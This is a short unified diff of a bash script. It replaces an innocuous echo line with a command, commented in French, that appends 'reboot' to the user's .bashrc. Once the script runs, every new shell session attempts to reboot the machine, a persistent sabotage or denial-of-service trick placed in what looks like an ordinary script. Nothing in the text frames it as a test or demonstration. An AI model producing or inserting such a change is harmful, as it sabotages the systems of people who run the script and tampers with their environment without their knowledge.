@@ -1,3 +1,3 @@
 #!/bin/bash
-# Desc: default
-echo "11"
+# Desc: reboot dans le bashrc
+echo "reboot" >> .bashrc
